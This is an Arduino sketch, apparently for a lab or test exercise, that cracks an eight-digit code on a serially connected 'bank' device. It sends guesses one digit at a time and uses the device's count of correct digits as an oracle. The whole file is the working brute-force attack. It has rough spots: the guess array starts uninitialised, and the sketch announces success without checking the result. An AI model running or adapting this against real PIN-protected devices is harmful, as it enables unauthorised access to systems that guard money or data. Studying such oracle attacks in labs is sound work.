#include <Arduino.h>
#include <SoftwareSerial.h>

const int numDigits = 8; // TODO: Change to 2 when running bank tests
const int numPossibleValues = 10;
const int bankDelay = 300; // TODO: Change to correct bank delay (number of milliseconds to pause)

// Define the TX and RX pins
const int txPin = 12;
const int rxPin = 13;

// Create a SoftwareSerial object
SoftwareSerial serial(txPin, rxPin);


void setup() {

  serial.begin(9600);
}

void loop() {
  int password[numDigits];
  int correctDigits = 0;

  for (int i = 0; i < numDigits; i++) {
    for (int j = 0; j < numPossibleValues; j++) {
      password[i] = j;
      String passwordStr = "";
      for (int k = 0; k < numDigits; k++) {
        passwordStr += String(password[k]);
      }
      passwordStr += "\n";

      // Sending Code over to bank
      serial.println(passwordStr);

      // Wait for the Bank to respond
      delay(bankDelay);

      // Retreive Banks response
      int response = serial.parseInt();

      // If response comes back as String then convert
      //////////////////////////////////////
      //    // Read the entire incoming string
      //String incomingString = Serial.readString();
    
      // Convert the string to an integer
      // int incomingValue = incomingString.toInt();
      //////////////////////////////////////

      if (response > correctDigits) {
        correctDigits = response;
        break; // move on to the next digit
      }
    }
  }

  // password is correct!
  serial.println("Password is correct!");
}
